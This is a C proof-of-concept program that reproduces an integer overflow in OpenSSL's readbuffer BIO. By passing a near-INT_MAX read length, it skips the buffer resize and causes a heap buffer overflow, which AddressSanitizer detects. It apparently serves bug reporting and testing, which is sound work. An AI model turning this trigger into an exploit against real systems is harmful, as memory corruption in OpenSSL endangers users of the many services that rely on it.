/*
 * Reproducer for integer overflow in readbuffer_resize() leading to
 * heap buffer overflow in readbuffer_read().
 *
 * File: crypto/bio/bf_readbuff.c
 * Function: readbuffer_resize (line 92) / readbuffer_read (line 141)
 *
 * Bug: In readbuffer_resize(), the calculation:
 *   sz += (ctx->ibuf_off + DEFAULT_BUFFER_SIZE - 1);
 * can overflow a signed int when ctx->ibuf_off is non-zero and sz (outl)
 * is close to INT_MAX. The overflow makes sz negative, which bypasses the
 * "sz > ctx->ibuf_size" resize check. Then readbuffer_read() calls
 * BIO_read() with the original large outl into a buffer that was not
 * resized, causing a heap buffer overflow.
 *
 * Compile:
 *   cc -fsanitize=address -g -I<openssl_src>/include reproducer_001.c \
 *      -L<openssl_build> -lcrypto -o reproducer_001
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <openssl/bio.h>
#include <openssl/err.h>

int main(void)
{
    BIO *mem_bio = NULL;
    BIO *rb_bio = NULL;
    char *read_buf = NULL;
    int ret = 1;

    /*
     * Step 1: Create a memory BIO and fill it with data.
     * We need enough data so that after the first small read,
     * the underlying BIO can still supply more data than the
     * readbuffer's internal buffer can hold.
     */
    mem_bio = BIO_new(BIO_s_mem());
    if (mem_bio == NULL) {
        fprintf(stderr, "Failed to create mem BIO\n");
        goto cleanup;
    }

    /* Write 64KB of data to the memory BIO */
    {
        char data[4096];
        int i;
        memset(data, 'A', sizeof(data));
        for (i = 0; i < 16; i++) {
            if (BIO_write(mem_bio, data, sizeof(data)) <= 0) {
                fprintf(stderr, "Failed to write to mem BIO\n");
                goto cleanup;
            }
        }
    }

    /*
     * Step 2: Create a readbuffer filter BIO and chain it to the memory BIO.
     */
    rb_bio = BIO_new(BIO_f_readbuffer());
    if (rb_bio == NULL) {
        fprintf(stderr, "Failed to create readbuffer BIO\n");
        goto cleanup;
    }
    rb_bio = BIO_push(rb_bio, mem_bio);

    /*
     * Step 3: Read a small amount to advance ibuf_off.
     * After this, ibuf_off = 4096, ibuf_size = 8192.
     */
    read_buf = malloc(65536);
    if (read_buf == NULL) {
        fprintf(stderr, "malloc failed\n");
        goto cleanup;
    }

    {
        int n = BIO_read(rb_bio, read_buf, 4096);
        if (n <= 0) {
            fprintf(stderr, "First BIO_read failed: %d\n", n);
            goto cleanup;
        }
        fprintf(stderr, "First read: %d bytes (ibuf_off now advanced)\n", n);
    }

    /*
     * Step 4: Trigger the integer overflow.
     *
     * In readbuffer_resize(ctx, outl):
     *   sz = outl
     *   sz += (ctx->ibuf_off + DEFAULT_BUFFER_SIZE - 1)
     *   sz += (4096 + 4096 - 1) = sz += 8191
     *
     * If outl = INT_MAX - 8190 = 2147475457:
     *   sz = 2147475457 + 8191 = 2147483648 (INT_MAX+1) → overflows to INT_MIN
     *   sz = 4096 * (INT_MIN / 4096) → large negative number
     *   sz > ibuf_size (8192) → false, NO RESIZE
     *
     * Then BIO_read(next_bio, ibuf + 4096, 2147475457) writes into a buffer
     * of size 8192 at offset 4096, with only 4096 bytes of space available.
     * The memory BIO returns ~60KB of remaining data → heap buffer overflow!
     */
    {
        int outl = INT_MAX - 8190; /* 2147475457 */
        int n;

        fprintf(stderr, "Triggering overflow with outl = %d\n", outl);
        n = BIO_read(rb_bio, read_buf, outl);
        fprintf(stderr, "Second BIO_read returned: %d\n", n);
    }

    fprintf(stderr, "If you see this without ASAN error, the bug may be fixed.\n");
    ret = 0;

cleanup:
    ERR_print_errors_fp(stderr);
    free(read_buf);
    /* BIO_pop + free to avoid double-free; BIO_free_all frees the chain */
    BIO_free_all(rb_bio);
    return ret;
}
